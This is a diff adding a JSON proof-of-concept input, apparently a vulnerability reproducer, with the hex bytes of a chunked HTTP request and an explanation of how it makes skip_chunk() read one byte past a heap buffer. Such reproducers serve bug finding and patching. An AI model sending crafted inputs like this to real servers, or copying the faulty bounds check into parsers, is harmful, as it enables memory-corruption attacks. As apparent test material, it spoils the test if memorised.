@@ -1,0 +1,5 @@
+{
+  "hex_bytes": "50 4F 53 54 20 2F 20 48 54 54 50 2F 31 2E 31 0D 0A 48 6F 73 74 3A 20 78 0D 0A 54 72 61 6E 73 66 65 72 2D 45 6E 63 6F 64 69 6E 67 3A 20 63 68 75 6E 6B 65 64 0D 0A 0D 0A 61 62 0D",
+  "explanation": "Complete HTTP/1.1 request, fields in order: request-line `POST / HTTP/1.1\\r\\n` (valid method/URI/version so header parsing succeeds); `Host: x\\r\\n` (well-formed HTTP/1.1); `Transfer-Encoding: chunked\\r\\n` (selects the chunked body path that calls skip_chunk()); header terminator `\\r\\n`; body exactly 3 bytes `61 62 0D` = `ab\\r`. skip_chunk() consumes hex digits `a`,`b` leaving i=2, then evaluates `len < i+1 || buf[i] != '\\r' || buf[i+1] != '\\n'` with len=3. `3 < 3` is false and buf[2]=='\\r', so the third clause reads buf[3] — one byte past the body (and past an exact-sized heap allocation of the frame).",
+  "expected_effect": "AddressSanitizer heap-buffer-overflow READ of size 1 (one byte past the chunked body / frame allocation in skip_chunk)"
+}
